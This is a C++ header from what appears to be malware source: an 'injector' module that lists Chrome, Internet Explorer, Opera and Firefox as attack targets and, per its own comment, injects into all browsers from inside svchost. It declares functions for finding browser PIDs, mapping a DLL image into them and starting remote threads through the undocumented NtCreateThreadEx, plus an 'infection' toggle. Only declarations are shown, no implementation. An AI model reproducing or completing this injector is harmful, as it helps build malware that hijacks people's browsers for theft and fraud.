#pragma once
#ifndef _WINDOWS_
#include <Windows.h>
#endif

#include <stdio.h>
#include <psapi.h>

#include <vector>

#ifndef CONFIG_OK
#include "../config.h"
#endif

#ifndef DISABLE_LIBRARY_INFO
#ifdef CONFIG_COMPILE64
#pragma message (OUTPUT_PRIMARY "injector: Loading standard memory module (64)")
#else 
#pragma message (OUTPUT_PRIMARY "injector: Loading standard memory module (32)")
#endif
#endif

#define DISABLE_OPERA_INFECTION

#ifndef USE_PE32
#include "core/pe.h"
#endif

#ifndef USE_PE
#include "core/pe.h"
#endif

namespace inject
{
	// Maximum amount of PIDs
#define INJECT_MAX_PIDS			1024
#define AVAILABLE_BROWSERS		4

#ifndef ERROR_CODE
#define ERROR_CODE UINT
#endif

	// Browser info
	typedef struct browser_attack_info {
		LPSTR		name;
		DWORD		pids[INJECT_MAX_PIDS];
	} BROWSER_ATTACK_INFO, *PBROWSER_ATTACK_INFO;

	typedef struct browser_attack_list {
		BROWSER_ATTACK_INFO		*attack_list[AVAILABLE_BROWSERS];
	} BROWSER_ATTACK_LIST, *PBROWSER_ATTACK_LIST;

	enum {
		BROWSER_CHROME,
		BROWSER_IE,
		BROWSER_OPERA,
		BROWSER_FF
	};

	static LPCSTR browser_list[AVAILABLE_BROWSERS] = {
		"chrome.exe",
		"iexplore.exe",
		"opera.exe",
		"firefox.exe"};

	typedef	NTSTATUS (WINAPI *LNtCreateThreadEx)(	OUT	PHANDLE						hThread,
													IN	ACCESS_MASK					DesiredAccess,
													IN	LPVOID						ObjectAttributes,
													IN	HANDLE						ProcessHandle,
													IN	LPTHREAD_START_ROUTINE		lpStartAddress,
													IN	LPVOID						lpParameter,
													IN	BOOL						CreateSuspended, 
													IN	ULONG						StackZeroBits,
													IN	ULONG						SizeOfStackCommit,
													IN	ULONG						SizeOfStackReserve,
													OUT	LPVOID						lpBytesBuffer);

	typedef struct NtCreateThreadExBuffer
	{
		SIZE_T	Size;
		SIZE_T	Unknown1;
		SIZE_T	Unknown2;
		PSIZE_T	Unknown3;
		SIZE_T	Unknown4;
		SIZE_T	Unknown5;
		SIZE_T	Unknown6;
		PSIZE_T	Unknown7;
		SIZE_T	Unknown8;
	} NTCREATETHREADEXBUFFER, *PNTCREATETHREADEXBUFFER;

	// Initializes some variables and that, returns browser_info struct 
	VOID init(inject::PBROWSER_ATTACK_LIST *attack_list);

	// When running in svchost, inject into all browsers
	VOID inject_to_browsers(VOID);

	// Finds all PIDs
	ERROR_CODE find_pids(	LPCSTR	process_name, DWORD	pid_array[INJECT_MAX_PIDS]);

	// Filter PIDs for chrome
	VOID filter_parents_pids(DWORD pid_array[INJECT_MAX_PIDS], DWORD pid_parent_array[INJECT_MAX_PIDS], DWORD explorer_pid);

	// Inject DLL
	ERROR_CODE inject_dll(DWORD pid, LPVOID virtual_image);

	// Returns the virtual image size
	UINT get_virtual_size(LPCVOID virtual_image);

	// Checks the validity of the PE header
	ERROR_CODE check_pe(LPCVOID virtual_image);

	// Gets the Base address of the virtual image
	DWORD get_virtual_base(LPCVOID virtual_image);

	// Returns the base address of the executing module
	LPVOID get_module_virtual_base(VOID);

	// Gets the virtual image OEP
	LPTHREAD_START_ROUTINE get_virtual_oep(LPCVOID virtual_image);

	// Creates the remote thread
	NTSTATUS create_dll_thread(HANDLE process, LPTHREAD_START_ROUTINE oep);

	class inject_instance {
	private:
		LPVOID					dll;
		DWORD					pid;

		pe::PPE_GEOMETRY		pe_geometry;

		bool					is_ok;
	public:
		inject_instance(__in const DWORD pid, __in const LPVOID dll, 
			__in const pe::PPE_GEOMETRY geometry) :
			dll(dll),
			pid(pid),
			is_ok(false),
			pe_geometry(NULL)
			{
				this->pe_geometry = (pe::PPE_GEOMETRY)mem::malloc(sizeof(pe::PE_GEOMETRY));
				mem::copy(this->pe_geometry, geometry, sizeof(pe::PE_GEOMETRY));
			}
		~inject_instance(VOID)
		{

		}
	};
}